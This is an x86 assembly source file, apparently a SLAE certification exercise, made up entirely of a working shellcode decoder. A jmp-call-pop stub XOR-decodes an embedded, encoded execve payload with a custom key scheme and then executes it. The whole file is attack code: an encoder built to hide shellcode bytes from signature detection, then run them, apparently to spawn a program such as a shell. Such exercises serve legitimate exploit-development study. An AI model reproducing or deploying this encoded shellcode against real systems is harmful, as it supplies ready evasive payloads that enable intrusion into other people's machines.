; Author:	SLAE-755
; Purpose:	This shellcode will decode an execve payload encoded using
;		a XOR custom schema


global _start			

section .text

_start:
	jmp short call_shellcode

decoder:
	pop esi

	xor eax, eax
	xor ecx, ecx
	xor edx, edx

	
decode:
	; The first two bytes in our shellcode is the initial XOR key
	; (I could decode one byte at time) 
 
	; key
	mov al, byte [esi]

	;decode byte at position esi+2 
	mov dl, byte [esi+2]
	xor dl, al
	mov byte [esi+2], dl

	;increment cl 
	add cl, 0x2 
	add esi, 0x1
	cmp cl, len
	jge short shellcode
	sub cl, 0x1	

	jmp short decode


call_shellcode:
	call decoder
	shellcode: db 0x31,0xc0,0x61,0xa8,0x7f,0x47,0x5c,0x47,0x1b,0x47,0x0a,0x46,0x0c,0xe0,0x8d,0xd9,0x6a,0xb2,0xda,0x6b,0xb2,0x39,0xea,0x7d,0x8b
	len: equ $-shellcode
